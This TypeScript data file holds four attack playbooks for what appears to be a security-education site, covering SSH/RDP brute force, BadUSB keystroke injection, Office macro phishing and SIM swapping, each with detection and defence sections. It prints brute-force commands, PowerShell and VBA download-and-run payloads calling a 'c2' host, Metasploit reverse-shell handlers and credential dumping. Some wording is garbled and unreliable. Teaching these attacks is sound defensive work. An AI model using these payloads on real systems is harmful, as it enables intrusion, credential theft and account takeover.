import type { AttackPlaybook } from "../types";

export const ATTACK_PLAYBOOKS_4: AttackPlaybook[] = [
  {
    slug: "ssh-rdp-brute-force",
    title: "Brute-forcing SSH & RDP",
    icon: "🚪",
    category: "system",
    summary:
      "Internet-exposed SSH (22) and RDP (3389) are attacked with torrents of guessed passwords — and win when an account has a weak, default, or reused password.",
    target: "Servers, workstations and cloud instances with an SSH or RDP port bound to the internet.",
    impact:
      "Shell access on the box, then credential theft, malware, or a foothold deeper in the network — RDP boxes are a top ransomware entry point.",
    tools: ["hydra", "ncrack", "medusa", "patator", "mimikatz", "wordlists", "metasploit"],
    introMd: `Two services dominate the internet's login surface: **SSH on 22** and **RDP on 3389**.

Attackers scan the whole IPv4 range for open ports (\`nmap\`), then feed the ones found through high-speed tries.

- **SSH**: \`hydra\`, \`ncrack\`, \`medusa\`, \`patator\` — massive password lists against a known username (\`root\`, \`admin\`).
- **RDP**: same style on 3389; because RDP precedes a Windows login, a hit offers the *entire desktop*, not just a shell.

> Authorised-lab only.

\`\`\`bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
ncrack -p 3389 -U users.txt -P pass.txt 192.168.1.15
\`\`\``,
    steps: [
      {
        title: "Surface the target",
        md: `Attackers find the login surface with one scan:

\`\`\`bash
nmap -p22,3389 -Pn --open -iL targets.txt -oG - | tee open_ports.gnmap
\`\`\`

And a version probe tells them what they're attacking:

\`\`\`bash
nmap -sV -p22,3389 <host>     # OpenSSH 8.2 vs Microsoft RDP = different weak spots
\`\`\`

RDP (port 3389) on a public IP is basically an open invitation to spray.

(Your scans belong on your own range or scope in writing.)`,
      },
      {
        title: "Guess smarter, not just louder",
        md: `Raw brute force only works on weak passwords — the loud version gets locked out.

The attacker's edge:

- **Username enrichment**: the box's real usernames from OSINT or a leaked set.
- **Password grooming**: derivatives of the company, year, \`Summer@24\`, \`Winter2024!\` — sprayed slowly to dodge lockouts.
- **Attack timing**: low-and-slow across weeks for sensitive targets.

\`\`\`bash
hydra -L users.txt -P tuned_passwords.txt ssh://target.example -t 4 -W 5
ncrack -p 3389 -U vuln_users.txt -P policy_spray.txt 192.168.1.15
\`\`\`

A \`t\`/thread count low enough stays under the radar.

(A lab user account is the only surface you practise this on.)`,
      },
      {
        title: "Walk in and pivot",
        md: `One valid login changes everything:

- **SSH**: a \`root\` or sudo account is game over; a user account is a foot in the door.
- **RDP**: a live Windows desktop — often one click from the admin's own password (\`mimikatz\` pulls creds from memory once you're in).

\`\`\`bash
ssh root@host -p 22                       # the moment a guess lands
# or from a Meterpreter session:
getsystem; hashdump                       # creds out of memory (Windows)
\`\`\`

From there the attacker installs persistence, plants ransomware, or uses the box as a launch pad.

Each weak password on an exposed port is a standing invitation.

(Testing principles: any real credentials you find on scope get *reported*, not exploited.)`,
      },
    ],
    detectionMd: `- **Auth log floods**: dozens of failed logins from one IP to one account (\`/var/log/auth.log\`), often hours of pattern.
- **Rate anomaly**: SSH or RDP attempts leaping on a box that never had them.
- **Successful-login + behavior change**: an unknown source IP logs in, then suddenly pulls big files / changes settings.
- **Honeytoken logins**: a ssh/rdp account that *no human uses*, logging in = intruder.

\`\`\`bash
tail -n 5000 /var/log/auth.log | grep "Failed password"
\`\`\`.

Lockout policies and fail2ban-style rate scripted detection catch the loud version.

(The low-and-slow spray evades log-watchers — which is why MFA matters so much.)`,
    defenseMd: `1. **Close the port**: never expose SSH/RDP to the internet — use a VPN or SSH-bastion instead.
2. **Key-based auth for SSH**; disable password auth entirely when possible.
3. **Strong, unique passwords + MFA** for any remaining password login (RDP supports smartcard/cert auth).
4. **Lockout + rate-limit** policies and account-bandit alerts (fail2ban for SSH).
5. **Move RDP behind a VPN** — the single highest-leverage change.

The formula: no public 22/3389 + keys instead of passwords + 2FA.

(A port that's never public is a port that's never brute-forced.)`,
  },
  {
    slug: "badusb-keystroke-injection",
    title: "BadUSB — keystroke injection via a plugged device",
    icon: "🖱️",
    category: "physical",
    summary:
      "A USB stick that identifies itself as a keyboard types commands at full speed into an unlocked workstation — installing a payload in seconds with nothing on the screen.",
    target: "Unlocked, unattended, or distracted workstations (the classic 'found USB' / 'left on the desk' play).",
    impact:
      "Arbitrary commands as the logged-in user: payload download, backdoor install, credential dump — with no malware file written by the victim's hand.",
    tools: ["metasploit", "msfvenom", "mimikatz"],
    introMd: `USB Rubber Ducky-style devices fake their descriptor: the OS sees a **keyboard**, not a storage device. It then types a pre-scripted sequence absurdly fast.

Because humans read screens in milliseconds and the injection runs in seconds, the demo doesn't even notice.

The combo: **physical access** (a dropped stick, a charging cable swap) + **keystroke script**.

\`\`\`text
DELAY 500
GUI r
DELAY 300
STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/load.ps1')"
ENTER
\`\`\``,
    steps: [
      {
        title: "Script up (DuckyScript)",
        md: `The language is typing commands with street-level pauses:

\`\`\`text
REM open run dialog
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 800
STRING powershell -ExecutionPolicy Bypass -File C:/Users/Public/a.ps1
ENTER
\`\`\`

Payload options:

- **Download-and-exec from the internet** — the stick just types one URL.
- **Start a listener-revil session** — \`msfvenom\` thermoplastic payload + staged from \`metasploit\`.
- **\`mimikatz\` one-liner** (\`sekurlsa::logonpasswords\`) — memory creds.

The script runs as *the logged-in user* — the same user, same privileges.

(Sticks on your own bench, unlocked VMs, explicitly-authorized desks.)`,
      },
      {
        title: "Deliver the device",
        md: `Physical delivery is the art:

- **The planted stick**: left in a parking lot / break room, "found" and plugged in.
- **The swapped charger/desk cable**: a keyboard-cable-lookalike with the injection hardware.
- **The clean desk test**: an attacker with 30 seconds in an unattended office.

Stronger attacks use the same hardware in malice for an *egg-cup*: it lands, types, and the payload's already running.

(Defender's job first: never plug in a stranger's stick, ever.)`,
      },
      {
        title: "The payload fires as the user",
        md: `At keystroke speed the script installs its tail:

\`\`\`bash
# listener side afterwards:
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
\`\`\`

The injected session enjoys the victim's privileges: file reads, keylogs, screenshots, or full \`hashdump\`.

If the target autologs-in or has screen-lock off, the injection happens unattended.

(Every real 'found USB' incident starts exactly like this — which is why the defense is 'never plug in').`,
      },
    ],
    detectionMd: `- **Keyboard-anomaly**: a Human-Interface Device (HID) connected that isn't a keyboard you recognise — visible in \`devmgmt\`/device events.
- **Fast typing bursts**: full-speed keystroke injection is a million-fold outlier from human rate — power-monitoring / log percussion flags it (in \`hid_logs\`).
- **Process launch right after USB connect**: an unexpected \`powershell\`/\`cmd\` after a new HID = the script tail.

\`\`\`bash
# Windows: check recently attached devices
powershell (Get-PnpDevice -PresentOnly | Where-Object Class -eq 'HIDClass').FriendlyName
\`\`\``,
    defenseMd: `1. **Never plug unknown USB into anything that matters.** The single best defense.
2. **Screen lock + auto-lock on idle** — unattended desktops are the target.
3. **USB-port controls**: group/device policy restricting HID or mass-storage by vendor.
4. **EDS (endpoint detection)**: an alert on the execute-after-HID-attach pattern.
5. **Authenticated peripherals** where feasible (signed HID firmware, managed docks).

Desk hygiene + believe the 'found USB' warning.

(A locked screen and no stranger-USBs kill this playbook cold.)`,
  },
  {
    slug: "macro-office-phishing",
    title: "Office macros — the SNL payload",
    icon: "📄",
    category: "social",
    summary:
      "An attachment (invoice, resume, 'document to review') asks the user to 'Enable Content'. The macro in it downloads malware — ransomware teams' classic door-opener.",
    target: "Companies and individuals who open Word/Excel attachments and click 'Enable Content'.",
    impact:
      "Malware on the machine at the user's permission level — often the exact kick-off ransomware families use before encryption.",
    tools: ["metasploit", "msfvenom", "set", "seclists", "evilginx"],
    introMd: `Microsoft Office macros are small programs attached to documents. Modern Office blocks them ('enable content?') — that wall *is* the attack.

**The ask**: "This document can't render until you Enable Content".

When the user clicks it, the macro runs.

\`\`\`vb
Sub AutoOpen()
  ' download and run the payload:
  Shell "powershell -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString(''http://c2/m.ps1'')""", 0
End Sub
\`\`\``,
    steps: [
      {
        title: "Author the macro",
        md: `The macro is a \`.docm\`/\`.xlsm\` with an \`AutoOpen\`/\`AutoExec\` routine.

Generation helpers keep it tidy:

- **\`set\`** → Website Vector → \`macro\`-style payloads (or the \`msfvenom\` format \`—platform windows -p windows/meterpreter/reverse_tcp\`).
- Manually: embed \`AutoOpen\` VBA that downloads & executes.

The two-layer classic: a *benign* first stage (downloads nothing) often shipped for **sandbox evasion**; the malicious macro only triggers with a live Office session.

(Word VBA macros in a sandbox run, but Word's 'Protected View' + a real download can beat naive sandboxes.),

For the lab: your own hosted .docm and a listener.

Tool pair that matters: \`set\` for generation, \`metasploit\`'s handler to receive.`,
      },
      {
        title: "Dress it up and deliver",
        md: `Delivery copies:

- **Invoice**: "March 2026 — attached, please review".
- **Resume** for a role the target just applied for.
- **HR/legal notice** — a fake @-from-name makes it plausible.

The attachment lands via email or a link. The sender skirt signatures with lookalike domains.

\`\`\`bash
# gophish-style campaign: track who opened + who enabled
\`\`\`

The trigger metric is "Enable Content" — every click is a consent.

(These emails are exactly what security-training simulators send.)`,
      },
      {
        title: "The release: payload → session",
        md: `Once macros run, machine-level control arrives:

\`\`\`bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
\`\`\`

- The downloaded stage (\`shell\`/\`ps1\`) calls home.
- The attacker has \`whoami\` + a prompt-level foothold.
- Then the pivot: \`keyscan\`, \`getsystem\`, \`hashdump\`, lateral movement.

Ransomware's day-one is this exact flow.

A single \`Enable Content\` on the right desk is a full intrusion.

(The defence lane — macro rules — exists specifically to block this.)`,
      },
    ],
    detectionMd: `- **Attachment origin**: an unsolicited .docm/.xlsm from an unfamiliar sender = hard flag.
- **Office 'Protected View'** being bypassed ('Enable Content' with a *download* macro) is the attacker's request.
- **Winlog**: a \`powershell\`/\`cmd\` spawned from \`winword\`/\`excel\` after a macro = the tell.

\`\`\`text
# SIEM: process creation where parent = winword.exe and child = powershell.exe
\`\`\`

(Macro-block by Group Policy is the blunt-but-effective cure.)`,
    defenseMd: `1. **Disable Office macros by policy** where the business doesn't need them (most don't).
2. **Never 'Enable Content'** on an attachment you didn't request.
3. **Show hidden extensions** and distrust double-.doc strange markers.
4. **Email security**: attachment sandboxing, block-in-doc policy.
5. **EDR hook** on child-process-from-office.

The one-click rule: if you didn't ask for the document, you never Enable.

(Macro infection is a consent problem — policy and habit handle it.)`,
  },
  {
    slug: "sim-swap-account-takeover",
    title: "SIM swapping — bounce the phone, take the account",
    icon: "📡",
    category: "physical",
    summary:
      "An attacker convinces a carrier to move a victim's number to a new SIM. SMS codes for 2FA now land with the attacker, who resets and owns the victim's email, bank and more.",
    target: "Anyone whose accounts use SMS text as the second factor, with a carrier that has weak phone-port checks.",
    impact:
      "Total identity takeover: email, banking, crypto wallets, social — because every code that unlocks them now personally arrives on the attacker's phone.",
    tools: ["gophish", "set"],
    introMd: `SMS codes are a common 2FA. **SIM swap** removes the "you" from that.

The attack on the carrier's trust scale:

1. The attacker learns the victim's undeniable facts (name, date of birth, address, sometimes the last 4 of the card) — via OSINT, leaked databases, or social engineering.
2. They contact the carrier: "I lost my phone, switch my number to this SIM".
3. If the check is phone-a-questionable, the carrier ports the number.

From that moment, \`Sign in with a code\` codes arrive on the attacker's phone.

> The fix is structural (Authenticator apps / hardware keys instead of SMS). This playbook documents the attack.

\`\`\`text
# there's no single tool: OSINT to learn the victim + social engineering.
# this playbook exists because carriers keep SMS 2FA cheap & common.
\`\`\``,
    steps: [
      {
        title: "Profile the victim",
        md: `The attacker collects the carrier-facing facts:

- **OSINT**: social posts, leaked DB fields, address/DB patterns.
- **Public records**: the victim's own voice (a rehearsed call).
- **Breach data**: name + DOB + address combos.

\`\`\`bash
# OSINT helps: theharvester, exif scraping, social searches
\`\`\`

The richer the "identity dossier", the better the impersonation.

(Defender fact: a strong dossier is the access. The fix is authenticator-hardened 2FA.)`,
      },
      {
        title: "Port the number",
        md: `Then the carrier call.

The standard scripts:

- **Retail visit**: present a copied card + rehearsed story ("I lost my phone").
- **Phone/support voice match**: same story, possibly repeated until a lenient agent bites.
- **Abuse of carrier self-service** where security-question answers are guessable.

Once approved: the victim's SIM dies (no service), the attacker's SIM rings.

The victim usually notices *before* the attacker finishes.

(For you: learning for defense — your carrier's porting checks are the kill switch.)`,
      },
      {
        title: "Drain before the 'Oops' closes",
        md: `Speed is everything now:

- **\`Forgot password\` on email** → the SMS code arrives on the attacker's phone.
- **Email reset** → then \`Reset password\` everywhere that accepts the mailbox: bank, social, crypto wallet.
- **Withdraw / spam-call while the victim's locked out**.

Minutes after the swap, the victim watches their own account reset.

Every step is logged — carriers + services can roll back if reported in minutes.

(The defender's lesson: authenticator app > SMS 2FA, every time.)`,
      },
    ],
    detectionMd: `- **"No service" suddenly on the phone** — the #1 symptom. A new SIM has silently taken over the number.
- **SMS codes to a dead number**: pending \`2FA\` prompts that fail to arrive.
- **Carrier notifications**: "your number was transferred" emails/SMS from the carrier.
- **Login DB/Email-based watch**: unexpected \`Password reset\` requests.

\`\`\`text
# the moment "no service" + "password reset" collide = act as breach
\`\`\`.

Report it instantly to the carrier (SIM revert) + the affected services.

(Victims who react in minutes usually get accounts back.)`,
    defenseMd: `1. **Stop using SMS as 2FA for anything that matters.** Authenticator apps (TOTP) + hardware keys (FIDO2) are portable and non-portable-friendly.
2. **Set up carrier 'port-PIN'** — a numeric passcode the carrier requires to transfer numbers.
3. **Use app-based backup codes** for recovery instead of phone-backed reset.
4. **Separate** a phone number used for bank/exchange from the public one.
5. **Watch for the 'no service' moment** near your reset flows.

The fix is structural: a \`TOTP\`/FIDO2 option makes the evil new SIM useless.

(SMS 2FA is a convenience, not a factor of security — treat it accordingly.)`,
  },
];